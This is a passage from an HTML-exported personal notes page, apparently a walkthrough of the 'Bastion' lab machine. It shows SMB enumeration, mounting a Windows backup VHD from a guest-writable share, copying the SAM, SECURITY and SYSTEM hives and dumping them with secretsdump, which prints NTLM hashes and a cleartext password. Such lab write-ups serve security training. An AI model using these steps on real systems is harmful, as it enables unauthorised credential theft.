+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-02-27T20:14:04
+|_  start_date: 2026-02-27T20:11:39
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+TRACEROUTE (using port 1723/tcp)
+HOP RTT     ADDRESS
+1   9.72 ms 10.10.14.1
+2   9.83 ms 10.129.136.29
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 92.14 seconds</code></pre></div>
+<p>SMB port is open where we have <code class="inline-code">READ</code> and <code class="inline-code">WRITE</code> access over the <code class="inline-code">Backups</code> share:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion]
+&boxur;&boxh;$ smbmap -H 10.129.136.29 -u guest 
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&apos; /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&apos;  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+[!] Unable to remove test file at \\10.129.136.29\Backups\PBIURJDMXG.txt, please remove manually                             
+                                                                                                                             
+[+] IP: 10.129.136.29:445	Name: 10.129.136.29       	Status: Authenticated
+    Disk                                                  	Permissions	Comment
+    ----                                                  	-----------	-------
+    ADMIN$                                            	NO ACCESS	Remote Admin
+    Backups                                           	READ, WRITE	
+    C$                                                	NO ACCESS	Default share
+    IPC$                                              	READ ONLY	Remote IPC
+[*] Closed 1 connections</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion]
+&boxur;&boxh;$ smbmap -H 10.129.136.29 -u guest 
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&apos; /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&apos;  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+[!] Unable to remove test file at \\10.129.136.29\Backups\PBIURJDMXG.txt, please remove manually                             
+                                                                                                                             
+[+] IP: 10.129.136.29:445	Name: 10.129.136.29       	Status: Authenticated
+    Disk                                                  	Permissions	Comment
+    ----                                                  	-----------	-------
+    ADMIN$                                            	NO ACCESS	Remote Admin
+    Backups                                           	READ, WRITE	
+    C$                                                	NO ACCESS	Default share
+    IPC$                                              	READ ONLY	Remote IPC
+[*] Closed 1 connections</code></pre></div>
+<p>There are interesting files inside the share:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion]
+&boxur;&boxh;$ smbclient //10.129.136.29/Backups                      
+Password for [WORKGROUP\kali]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Feb 27 15:15:16 2026
+  ..                                  D        0  Fri Feb 27 15:15:16 2026
+  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
+  PBIURJDMXG.txt                      A        0  Fri Feb 27 15:15:16 2026
+  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
+  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019
+
+        5638911 blocks of size 4096. 1178451 blocks available
+smb: \&gt; </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion]
+&boxur;&boxh;$ smbclient //10.129.136.29/Backups                      
+Password for [WORKGROUP\kali]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Fri Feb<span class="hljs-number"> 27 </span>15:15:16 2026
+  ..                                  D       <span class="hljs-number"> 0 </span> Fri Feb<span class="hljs-number"> 27 </span>15:15:16 2026
+  note.txt                           AR     <span class="hljs-number"> 116 </span> Tue Apr<span class="hljs-number"> 16 </span>06:10:09 2019
+  PBIURJDMXG.txt                      A       <span class="hljs-number"> 0 </span> Fri Feb<span class="hljs-number"> 27 </span>15:15:16 2026
+  SDT65CB.tmp                         A       <span class="hljs-number"> 0 </span> Fri Feb<span class="hljs-number"> 22 </span>07:43:08 2019
+  WindowsImageBackup                 Dn       <span class="hljs-number"> 0 </span> Fri Feb<span class="hljs-number"> 22 </span>07:44:02 2019
+
+       <span class="hljs-number"> 5638911 </span>blocks of size 4096.<span class="hljs-number"> 1178451 </span>blocks available
+smb: \&gt; </code></pre></div>
+<p>Mount the remote share locally:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[/mnt/remote]
+&boxur;&boxh;$ sudo mount -t cifs //10.129.136.29/Backups /mnt/remote -o rw
+Password for root@//10.129.136.29/Backups:</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[<span class="hljs-regexp">/mnt/</span>remote]
+&boxur;&boxh;$ sudo mount -t cifs <span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">136.29</span><span class="hljs-regexp">/Backups /m</span>nt/remote -o rw
+Password <span class="hljs-keyword">for</span> root@<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">136.29</span>/Backups:</code></pre></div>
+<p>Now we have access to all the files in the share:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[/mnt/remote]
+&boxur;&boxh;$ ls -la
+total 9
+drwxr-xr-x 2 root root 4096 Feb 27 15:15 .
+drwxr-xr-x 3 root root 4096 Feb 27 15:24 ..
+-r-xr-xr-x 1 root root  116 Apr 16  2019 note.txt
+-rwxr-xr-x 1 root root    0 Feb 27 15:15 PBIURJDMXG.txt
+-rwxr-xr-x 1 root root    0 Feb 22  2019 SDT65CB.tmp
+drwxr-xr-x 2 root root    0 Feb 22  2019 WindowsImageBackup</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[/mnt/remote]
+&boxur;&boxh;$ ls -la
+total 9
+drwxr-xr-x<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Feb<span class="hljs-number"> 27 </span>15:15 .
+drwxr-xr-x<span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>Feb<span class="hljs-number"> 27 </span>15:24 ..
+-r-xr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 116 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2019 </span>note.txt
+-rwxr-xr-x<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 0 </span>Feb<span class="hljs-number"> 27 </span>15:15 PBIURJDMXG.txt
+-rwxr-xr-x<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 0 </span>Feb<span class="hljs-number"> 22 </span><span class="hljs-number"> 2019 </span>SDT65CB.tmp
+drwxr-xr-x<span class="hljs-number"> 2 </span>root root   <span class="hljs-number"> 0 </span>Feb<span class="hljs-number"> 22 </span><span class="hljs-number"> 2019 </span>WindowsImageBackup</code></pre></div>
+<p>There are two <code class="inline-code">.vhd</code> files inside the backup directory:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[/mnt/remote/WindowsImageBackup/L4mpje-PC]
+&boxur;&boxh;$ ls -la -R   
+.:
+total 4
+drwxr-xr-x 2 root root  0 Feb 22  2019  .
+drwxr-xr-x 2 root root  0 Feb 22  2019  ..
+drwxr-xr-x 2 root root  0 Feb 22  2019 &apos;Backup 2019-02-22 124351&apos;
+drwxr-xr-x 2 root root  0 Feb 22  2019  Catalog
+-rwxr-xr-x 1 root root 16 Feb 22  2019  MediaId
+drwxr-xr-x 2 root root  0 Feb 22  2019  SPPMetadataCache
+
+&apos;./Backup 2019-02-22 124351&apos;:
+total 5330560
+drwxr-xr-x 2 root root          0 Feb 22  2019 .
+drwxr-xr-x 2 root root          0 Feb 22  2019 ..
+-rwxr-xr-x 1 root root   37761024 Feb 22  2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+-rwxr-xr-x 1 root root 5418299392 Feb 22  2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+-rwxr-xr-x 1 root root       1186 Feb 22  2019 BackupSpecs.xml
+-rwxr-xr-x 1 root root       1078 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+-rwxr-xr-x 1 root root       8930 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+-rwxr-xr-x 1 root root       6542 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+-rwxr-xr-x 1 root root       2894 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+-rwxr-xr-x 1 root root       1488 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+-rwxr-xr-x 1 root root       1484 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+-rwxr-xr-x 1 root root       3844 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+-rwxr-xr-x 1 root root       3988 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+-rwxr-xr-x 1 root root       7110 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+-rwxr-xr-x 1 root root    2374620 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[/mnt/remote/WindowsImageBackup/L4mpje-PC]
+&boxur;&boxh;$ ls -la -R   
+.:
+total 4
+drwxr-xr-x 2 root root  0 Feb 22  2019  .
+drwxr-xr-x 2 root root  0 Feb 22  2019  ..
+drwxr-xr-x 2 root root  0 Feb 22  2019 &apos;Backup 2019-02-22 124351&apos;
+drwxr-xr-x 2 root root  0 Feb 22  2019  Catalog
+-rwxr-xr-x 1 root root 16 Feb 22  2019  MediaId
+drwxr-xr-x 2 root root  0 Feb 22  2019  SPPMetadataCache
+
+&apos;./Backup 2019-02-22 124351&apos;:
+total 5330560
+drwxr-xr-x 2 root root          0 Feb 22  2019 .
+drwxr-xr-x 2 root root          0 Feb 22  2019 ..
+-rwxr-xr-x 1 root root   37761024 Feb 22  2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+-rwxr-xr-x 1 root root 5418299392 Feb 22  2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+-rwxr-xr-x 1 root root       1186 Feb 22  2019 BackupSpecs.xml
+-rwxr-xr-x 1 root root       1078 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+-rwxr-xr-x 1 root root       8930 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+-rwxr-xr-x 1 root root       6542 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+-rwxr-xr-x 1 root root       2894 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+-rwxr-xr-x 1 root root       1488 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+-rwxr-xr-x 1 root root       1484 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+-rwxr-xr-x 1 root root       3844 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+-rwxr-xr-x 1 root root       3988 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+-rwxr-xr-x 1 root root       7110 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+-rwxr-xr-x 1 root root    2374620 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml</code></pre></div>
+<p>According to this <a data-from-md="" title="https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25" href="https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25">post</a>, we can mount the <code class="inline-code">.vhd</code>. Make a directory called <code class="inline-code">vhd</code> over at <code class="inline-code">/mnt</code>, and then run the following command to mount the <code class="inline-code">vhd</code> file:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">sudo guestmount --add &quot;/mnt/remote/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd&quot; --inspector --ro /mnt/vhd -v</pre><pre class="hljs"><code>sudo guestmount <span class="hljs-params">--add</span> <span class="hljs-string">&quot;/mnt/remote/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd&quot;</span> <span class="hljs-params">--inspector</span> <span class="hljs-params">--ro</span> <span class="hljs-string">/mnt/vhd</span> -v</code></pre></div>
+<p>Now we have access to the files:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(root㉿kali)-[/mnt/vhd]
+&boxur;&boxh;# ls -la
+total 2096745
+drwxrwxrwx 1 root root      12288 Feb 22  2019  .
+drwxr-xr-x 4 root root       4096 Feb 27 16:03  ..
+drwxrwxrwx 1 root root          0 Feb 22  2019 &apos;$Recycle.Bin&apos;
+-rwxrwxrwx 1 root root         24 Jun 10  2009  autoexec.bat
+-rwxrwxrwx 1 root root         10 Jun 10  2009  config.sys
+lrwxrwxrwx 2 root root         14 Jul 14  2009 &apos;Documents and Settings&apos; -&gt; /sysroot/Users
+-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
+drwxrwxrwx 1 root root          0 Jul 13  2009  PerfLogs
+drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
+drwxrwxrwx 1 root root       4096 Apr 11  2011 &apos;Program Files&apos;
+drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
+drwxrwxrwx 1 root root       4096 Feb 22  2019 &apos;System Volume Information&apos;
+drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
+drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(root㉿kali)-[/mnt/vhd]
+&boxur;&boxh;<span class="hljs-comment"># ls -la</span>
+total 2096745
+drwxrwxrwx<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 12288 </span>Feb<span class="hljs-number"> 22 </span><span class="hljs-number"> 2019 </span> .
+drwxr-xr-x<span class="hljs-number"> 4 </span>root root      <span class="hljs-number"> 4096 </span>Feb<span class="hljs-number"> 27 </span>16:03  ..
+drwxrwxrwx<span class="hljs-number"> 1 </span>root root         <span class="hljs-number"> 0 </span>Feb<span class="hljs-number"> 22 </span><span class="hljs-number"> 2019 </span>&apos;$Recycle.Bin&apos;
+-rwxrwxrwx<span class="hljs-number"> 1 </span>root root        <span class="hljs-number"> 24 </span>Jun<span class="hljs-number"> 10 </span><span class="hljs-number"> 2009 </span> autoexec.bat
+-rwxrwxrwx<span class="hljs-number"> 1 </span>root root        <span class="hljs-number"> 10 </span>Jun<span class="hljs-number"> 10 </span><span class="hljs-number"> 2009 </span> config.sys
+lrwxrwxrwx<span class="hljs-number"> 2 </span>root root        <span class="hljs-number"> 14 </span>Jul<span class="hljs-number"> 14 </span><span class="hljs-number"> 2009 </span>&apos;Documents and Settings&apos; -&gt; /sysroot/Users
+-rwxrwxrwx<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2147016704 </span>Feb<span class="hljs-number"> 22 </span><span class="hljs-number"> 2019 </span> pagefile.sys
+drwxrwxrwx<span class="hljs-number"> 1 </span>root root         <span class="hljs-number"> 0 </span>Jul<span class="hljs-number"> 13 </span><span class="hljs-number"> 2009 </span> PerfLogs
+drwxrwxrwx<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 14 </span><span class="hljs-number"> 2009 </span> ProgramData
+drwxrwxrwx<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 4096 </span>Apr<span class="hljs-number"> 11 </span><span class="hljs-number"> 2011 </span>&apos;Program Files&apos;
+drwxrwxrwx<span class="hljs-number"> 1 </span>root root         <span class="hljs-number"> 0 </span>Feb<span class="hljs-number"> 22 </span><span class="hljs-number"> 2019 </span> Recovery
+drwxrwxrwx<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 4096 </span>Feb<span class="hljs-number"> 22 </span><span class="hljs-number"> 2019 </span>&apos;System Volume Information&apos;
+drwxrwxrwx<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 4096 </span>Feb<span class="hljs-number"> 22 </span><span class="hljs-number"> 2019 </span> Users
+drwxrwxrwx<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 16384 </span>Feb<span class="hljs-number"> 22 </span><span class="hljs-number"> 2019 </span> Windows</code></pre></div>
+<p>Browser over to the <code class="inline-code">/Windows/System32/config</code> directory and copy the <code class="inline-code">system</code>, <code class="inline-code">sam</code>, and <code class="inline-code">security</code> hives:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(root㉿kali)-[/mnt/vhd/Windows/System32/config]
+&boxur;&boxh;# ls -la
+total 74740
+drwxrwxrwx 1 root root    12288 Feb 22  2019 .
+drwxrwxrwx 1 root root   655360 Feb 22  2019 ..
+-rwxrwxrwx 2 root root    28672 Feb 22  2019 BCD-Template
+-rwxrwxrwx 2 root root    25600 Feb 22  2019 BCD-Template.LOG
+-rwxrwxrwx 2 root root 30932992 Feb 22  2019 COMPONENTS
+-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.0.regtrans-ms
+-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.1.regtrans-ms
+-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.2.regtrans-ms
+-rwxrwxrwx 2 root root    65536 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.blf
+-rwxrwxrwx 2 root root    65536 Feb 22  2019 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TM.blf
+-rwxrwxrwx 2 root root   524288 Feb 22  2019 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms
+-rwxrwxrwx 2 root root   524288 Jul 14  2009 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms
+-rwxrwxrwx 2 root root     1024 Apr 11  2011 COMPONENTS.LOG
+-rwxrwxrwx 2 root root   262144 Feb 22  2019 COMPONENTS.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 COMPONENTS.LOG2
+-rwxrwxrwx 1 root root   262144 Feb 22  2019 DEFAULT
+-rwxrwxrwx 1 root root     1024 Apr 11  2011 DEFAULT.LOG
+-rwxrwxrwx 2 root root    91136 Feb 22  2019 DEFAULT.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 DEFAULT.LOG2
+drwxrwxrwx 1 root root        0 Jul 13  2009 Journal
+drwxrwxrwx 1 root root        0 Feb 22  2019 RegBack
+-rwxrwxrwx 1 root root   262144 Feb 22  2019 SAM
+-rwxrwxrwx 1 root root     1024 Apr 11  2011 SAM.LOG
+-rwxrwxrwx 2 root root    21504 Feb 22  2019 SAM.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 SAM.LOG2
+-rwxrwxrwx 1 root root   262144 Feb 22  2019 SECURITY
+-rwxrwxrwx 1 root root     1024 Apr 11  2011 SECURITY.LOG
+-rwxrwxrwx 2 root root    21504 Feb 22  2019 SECURITY.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 SECURITY.LOG2
+-rwxrwxrwx 1 root root 24117248 Feb 22  2019 SOFTWARE
+-rwxrwxrwx 1 root root     1024 Apr 11  2011 SOFTWARE.LOG
+-rwxrwxrwx 2 root root   262144 Feb 22  2019 SOFTWARE.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 SOFTWARE.LOG2
+-rwxrwxrwx 1 root root  9699328 Feb 22  2019 SYSTEM
+-rwxrwxrwx 1 root root     1024 Apr 11  2011 SYSTEM.LOG
+-rwxrwxrwx 2 root root   262144 Feb 22  2019 SYSTEM.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 SYSTEM.LOG2
+drwxrwxrwx 1 root root     4096 Nov 20  2010 systemprofile
+drwxrwxrwx 1 root root     4096 Feb 22  2019 TxR
+                                                                                                                                                                                                                     
+&boxdr;&boxh;&boxh;(root㉿kali)-[/mnt/vhd/Windows/System32/config]
+&boxur;&boxh;# cp SAM /home/kali/Desktop/Labs/Bastion
+                                                                                                                                                                                                                     
+&boxdr;&boxh;&boxh;(root㉿kali)-[/mnt/vhd/Windows/System32/config]
+&boxur;&boxh;# cp SECURITY /home/kali/Desktop/Labs/Bastion
+                                                                                                                                                                                                                     
+&boxdr;&boxh;&boxh;(root㉿kali)-[/mnt/vhd/Windows/System32/config]
+&boxur;&boxh;# cp SYSTEM /home/kali/Desktop/Labs/Bastion</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(root㉿kali)-[/mnt/vhd/Windows/System32/config]
+&boxur;&boxh;# ls -la
+total 74740
+drwxrwxrwx 1 root root    12288 Feb 22  2019 .
+drwxrwxrwx 1 root root   655360 Feb 22  2019 ..
+-rwxrwxrwx 2 root root    28672 Feb 22  2019 BCD-Template
+-rwxrwxrwx 2 root root    25600 Feb 22  2019 BCD-Template.LOG
+-rwxrwxrwx 2 root root 30932992 Feb 22  2019 COMPONENTS
+-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.0.regtrans-ms
+-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.1.regtrans-ms
+-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.2.regtrans-ms
+-rwxrwxrwx 2 root root    65536 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.blf
+-rwxrwxrwx 2 root root    65536 Feb 22  2019 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TM.blf
+-rwxrwxrwx 2 root root   524288 Feb 22  2019 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms
+-rwxrwxrwx 2 root root   524288 Jul 14  2009 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms
+-rwxrwxrwx 2 root root     1024 Apr 11  2011 COMPONENTS.LOG
+-rwxrwxrwx 2 root root   262144 Feb 22  2019 COMPONENTS.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 COMPONENTS.LOG2
+-rwxrwxrwx 1 root root   262144 Feb 22  2019 DEFAULT
+-rwxrwxrwx 1 root root     1024 Apr 11  2011 DEFAULT.LOG
+-rwxrwxrwx 2 root root    91136 Feb 22  2019 DEFAULT.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 DEFAULT.LOG2
+drwxrwxrwx 1 root root        0 Jul 13  2009 Journal
+drwxrwxrwx 1 root root        0 Feb 22  2019 RegBack
+-rwxrwxrwx 1 root root   262144 Feb 22  2019 SAM
+-rwxrwxrwx 1 root root     1024 Apr 11  2011 SAM.LOG
+-rwxrwxrwx 2 root root    21504 Feb 22  2019 SAM.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 SAM.LOG2
+-rwxrwxrwx 1 root root   262144 Feb 22  2019 SECURITY
+-rwxrwxrwx 1 root root     1024 Apr 11  2011 SECURITY.LOG
+-rwxrwxrwx 2 root root    21504 Feb 22  2019 SECURITY.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 SECURITY.LOG2
+-rwxrwxrwx 1 root root 24117248 Feb 22  2019 SOFTWARE
+-rwxrwxrwx 1 root root     1024 Apr 11  2011 SOFTWARE.LOG
+-rwxrwxrwx 2 root root   262144 Feb 22  2019 SOFTWARE.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 SOFTWARE.LOG2
+-rwxrwxrwx 1 root root  9699328 Feb 22  2019 SYSTEM
+-rwxrwxrwx 1 root root     1024 Apr 11  2011 SYSTEM.LOG
+-rwxrwxrwx 2 root root   262144 Feb 22  2019 SYSTEM.LOG1
+-rwxrwxrwx 2 root root        0 Jul 13  2009 SYSTEM.LOG2
+drwxrwxrwx 1 root root     4096 Nov 20  2010 systemprofile
+drwxrwxrwx 1 root root     4096 Feb 22  2019 TxR
+                                                                                                                                                                                                                     
+&boxdr;&boxh;&boxh;(root㉿kali)-[/mnt/vhd/Windows/System32/config]
+&boxur;&boxh;# cp SAM /home/kali/Desktop/Labs/Bastion
+                                                                                                                                                                                                                     
+&boxdr;&boxh;&boxh;(root㉿kali)-[/mnt/vhd/Windows/System32/config]
+&boxur;&boxh;# cp SECURITY /home/kali/Desktop/Labs/Bastion
+                                                                                                                                                                                                                     
+&boxdr;&boxh;&boxh;(root㉿kali)-[/mnt/vhd/Windows/System32/config]
+&boxur;&boxh;# cp SYSTEM /home/kali/Desktop/Labs/Bastion</code></pre></div>
+<p>Dump the contents of the three hives:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion]
+&boxur;&boxh;$ sudo impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
+[sudo] password for kali: 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] DefaultPassword 
+(Unknown User):bureaulampje
+[*] DPAPI_SYSTEM 
